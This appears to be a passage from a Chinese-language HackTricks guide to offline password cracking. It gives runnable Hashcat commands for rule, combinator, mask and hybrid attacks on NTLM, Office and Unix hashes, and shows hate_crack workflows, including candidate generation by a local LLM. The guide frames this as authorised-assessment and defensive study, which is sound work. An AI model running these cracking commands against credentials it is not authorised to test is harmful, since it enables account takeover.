hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### 解释并分析规则文件

Hashcat 规则从左向右执行操作码。操作作用于位置零时很容易看错：`^e ^h ^t` 会先添加 `e`，再添加 `h`，最后添加 `t`，因此会将 `password` 变为 `thepassword`。替换操作会按字节进行区分大小写的比较，因此像 `sa@` 这样的规则对大写 `A` 不起作用。在花费 GPU 时间之前，先用有代表性的全小写、全大写和大小写混合 basewords 测试不熟悉的规则。<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) 可以显示每个中间候选项，还可以统计完整规则文件中的操作码分布。静态操作码计数可以揭示某个文件主要是追加、前置、替换还是截断字符。它们不能证明某条规则一定能破解密码，但有助于选择符合目标人群已观察到的密码模式的规则集。<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### 使用 debug logs 减少冗余规则

Hashcat debug mode 会将规则转换记录与常规状态和结果输出分开。模式 `4` 写入 `baseword:rule:candidate`；模式 `5` 会附加源 wordlist。务必显式设置 `--debug-file`。否则，Hashcat 会在其配置目录中打开 `hashcat.debugfile`，而重定向 stdout 捕获的是控制台流，不是这些记录。Debug 文件以追加模式打开，因此开始新的测量前，请删除或轮换旧文件，并妥善保护该文件，因为其中包含明文 baseword 和 candidate。<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

使用 `frequency` 查找应用频率最高的规则，使用 `basewords` 衡量不同输入的覆盖范围，并使用 `candidates` 统计不同输出的数量。候选项排名通常是精简规则的最佳起点，因为即使某条规则应用频繁，也可能将许多输入合并为重复的候选项。将价值最高的规则复制到一个较小的文件中，对剩余的哈希重新运行，并比较每次运行的报告。模式 `5` 还会显示每个源 wordlist 是否提供了有用的 basewords；如果数据中的冒号导致自动检测出现歧义，可使用 `--debug-mode 4` 或 `--debug-mode 5` 强制解析。<sup>[[6]](#references)[[9]](#references)</sup>

- **Wordlist combinator** 攻击

hashcat 可以将 **2 个 wordlist 合并为 1 个**。\
如果列表 1 中包含单词 **"hello"**，而第二个列表中有两行，分别包含单词 **"world"** 和 **"earth"**，就会生成 `helloworld` 和 `helloearth`。

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks（加密 Office 示例）

密码可能很长且包含多个字符类别，但如果它遵循已知语法，其**有效搜索空间**仍可能很小。对于在授权评估中获取的加密 Office 文档，`office2john.py` 会提取密码验证记录；这样便可在本地进行猜测，不受在线锁定、速率限制或 MFA 的影响。它不会绕过文档加密。<sup>[[2]](#references)[[5]](#references)</sup>

去掉 John 添加的文件名字段，使 Hashcat 只接收验证器：<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

从提取出的前缀选择 `-m`，不要根据文件扩展名选择。Hashcat 将 `$office$*2007*`、`$office$*2010*` 和 `$office$*2013*` 映射到模式 `9400`、`9500` 和 `9600`；旧版 `$oldoffice$0/$1` 和 `$oldoffice$3/$4` 记录分别使用模式 `9700` 和 `9800`。<sup>[[3]](#references)</sup>

如果有关密码复用、策略、提示或熟悉用户的人士提供的信息揭示了类似 `<word><number><optional !><word>` 的语法，就将可独立枚举的前缀生成为左侧字典。此示例测试从 `0` 到 `99` 的数字；请根据评估中发现的证据替换范围和转换方式。<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Hashcat attack mode `1` 会将右侧字典中的每一行追加到左侧字典的每一行后面，因此包含 `L` 行和 `R` 行的文件会在应用任何规则之前生成 `L × R` 个候选项。以下命令专用于旧版 `$oldoffice$3/$4` 记录；对于其他 Office 格式，请更改模式。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

这种预处理模式也适用于其他可离线验证的格式：只枚举某个组件中合理的大小写形式、日期、分隔符、数字或标点，然后将其与其余组件组合，而不是对名义上的完整长度进行 brute-force。<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### 在运行前验证 `.hcmask` 文件

格式错误的行可能混在有效掩码中而被忽略，因此在启动攻击前，请验证整个文件及其估算的 keyspace。只要有任何掩码无效，HashcatRosetta 就会报告出错行并返回非零状态，因此适合在脚本或 CI 中执行此检查。<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

不要使用通用 CSV 或文本解析器规范化 mask 文件。Hashcat 支持自定义字符集 `?1` 到 `?8`，仅当 `#` 是首字节时才将其视为注释，并会在解析 `?` token 前一次性移除反斜杠转义。因此，`#` 前的空白属于 mask 数据，而转义会改变某个序列被解析为字面字符还是字符集 token。<sup>[[6]](#references)[[9]](#references)</sup>

- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) 攻击

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### 使用 hate_crack 进行目标定制训练的 Hashcat 破解

[hate_crack](https://github.com/trustedsec/hate_crack) 在你获得 hash 文件并知道其 Hashcat mode 后，会编排本地 Hashcat 破解流程。Hashcat 必须单独安装。使用子模块克隆仓库，运行 `make`，然后启动交互式会话；示例中的 mode `1000` 是 NTLM，并非通用默认值。使用 PCFG 和 PRINCE-LING 选项前，已有的克隆仓库需要先运行 `git submodule update --init --recursive`。<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**从恢复的明文中学习语法。** 先进行一轮初始字典/规则处理，然后用与目标相关的明文训练 `pcfg_cracker`。在 `config.json` 中将 `pcfgRuleset` 设为训练好的 ruleset，并选择 PCFG（菜单 `20`），将可能的结构流式传入 Hashcat；或选择 PRINCE-LING（`21`），生成由语法引导的 PRINCE 基础列表。使用 `pcfgMaxCandidates` 和 `pcfgPrinceLingMaxCandidates` 限制这两个生成器的候选数量；hate_crack 不会替你训练语法。PCFG 会学习诸如基础词加数字和符号这类结构的概率，这与 [组合器示例](#grammar-driven-combinator-attacks-encrypted-office-example)中的固定语法不同。<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**从已知密码反向推导规则。** Spoonman（菜单 `22`）接收明文语料，其中包括当前会话的非空 `.out` 文件，并推导出小写字母 basewords 及可重构观测到的密码的 Hashcat rules。它根据每条规则能够还原的语料密码数量对规则进行排名。先从覆盖率最高的 50% 规则层级开始，只有在增加的 keyspace 合理时才继续扩展；如果覆盖率受限的原因是缺少词干而非变形方式，则将推导出的 basewords 与其他相关 wordlists 组合使用。Hashcat 的每条 rule 最多接受 31 个函数，且位置字母表只能寻址索引 `0`–`35`；如果密码无法编码，Spoonman 会使用字面值 baseword 和 no-op rule。超大型语料可能触及其有界内存计数器上限，因此应查看报告的覆盖率，而不是假设已完整还原。若要独立重用输出，请先查看 [Hashcat rule 行为](#explain-and-profile-rule-files)。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**根据现有证据选择生成器。** OMEN（`13`）从密码列表训练字符转移模型，并按概率顺序枚举候选项，数量上限由 `omenMaxCandidates` 设定。Markov brute force（`15`）则可以根据当前 `.out` 破解结果或指定列表生成 `.hcstat2` 表，并测试增量长度范围。当目标情报是文本而非密码时，N-gram（`16`）会将语料（包括 gzip 输入）传给 `ngramX.bin`；其默认组大小为三。这些是不同的替代方案，并非同一候选列表的三个副本。<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**仅扩展规模小且合理的候选池。** Permutation（`17`）会重新排列每个输入词中的所有字符，因此即使只有一个八字符单词，也会产生 `8!` 种排列。Combipow（`19`）会从简短的 passphrase 单词池中生成非空子集组合；`-s` 会插入空格，且该工具拒绝超过 63 行的输入。Combinator（`6`）可以通过 `--sepFill` 使用分隔符连接多个 wordlists；普通的双列表拼接可使用上文的 [原生 Hashcat combinator](#hashcat-attacks)。<sup>[[13]](#references)[[14]](#references)</sup>

**为反馈式攻击设定预算。** Fingerprint（`5`）会按片段长度递增，迭代扩展新破解的密码，而不是每轮重新扩展整个语料；其组合 keyspace 阈值会跳过规模过大的 `-a 1` 阶段。Hybrid（`7`）会先尝试成本较低的 `?s?d` 装饰，再尝试范围更广的 `?a` 前置/后置掩码；`hcatHybridMaxRuntime` 用于限制运行时长。这很重要，因为 hybrid 阶段的成本等于 wordlist 大小乘以掩码空间，因此对大型列表使用宽泛掩码，成本可能远超初始阶段。<sup>[[13]](#references)[[14]](#references)</sup>

**使用本地 LLM 根据已恢复的密码生成候选项。** 初始阶段生成非空的 `<hashfile>.out` 后，hate_crack 的 LLM attack（主菜单 `12`，**Cracked passwords** 子菜单 `3`）可以推断目标特有的 basewords、年份、后缀和大小写习惯，然后向 Hashcat 提交新的候选项。对于小型语料，可以在模型提示中加入已恢复的明文；对于较大的语料，则会将其概括为统计信息。这种方法可以归纳观测到的习惯，而非仅重放上文固定的 [rules](#explain-and-profile-rule-files) 或 [masks](#hashcat-attacks)。<sup>[[13]](#references)[[14]](#references)</sup>

在 hate_crack 的 `.env` 中配置已启动服务的本地 Ollama 模型；它不会自动拉取模型。`OLLAMA_NO_CLOUD=true` 会拒绝带有 cloud 标记的模型及站外 endpoint 地址。仅使用 localhost endpoint 并不足够：Ollama 可以将 `-cloud` 模型代理到远程，而提示中可能包含已恢复的明文或语料统计信息。此设置仍允许私有网络 endpoint，且无法排除传输代理，因此在发送客户数据前，请确认推理路径。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

先用成本更低的规则、掩码和针对目标训练的轮次对比候选产出率，再分配更大的预算。模型生成猜测；Hashcat 仍会针对哈希进行测试。<sup>[[13]](#references)[[14]](#references)</sup>

#### Hashcat 模式

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

破解 Linux 哈希 - /etc/shadow 文件

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

破解 Windows 哈希s

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

破解常见应用程序哈希值

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [深入了解 GoBruteforcer：AI 生成的服务器默认配置、弱密码和以加密货币为目标的攻击活动](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper：`office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hashcat 示例哈希和 Microsoft Office 模式](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Hashcat 组合攻击](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [凭据的遗产规划](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [HashcatRosetta 仓库](https://github.com/bandrel/HashcatRosetta)
- [7] [Hashcat 调试文件实现](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Hashcat 命令行帮助](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta：解读密码破解的罗塞塔石碑](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [PCFG Cracker 仓库和用法](https://github.com/lakiw/pcfg_cracker)
- [11] [OMEN 仓库和用户指南](https://github.com/RUB-SysSec/OMEN)
- [12] [Spoonman 原始问题和规则推导设计](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [hate_crack 仓库和攻击文档](https://github.com/trustedsec/hate_crack)
- [14] [hate_crack 2.0 之后的新变化](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [hate_crack LLM 目标策略](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
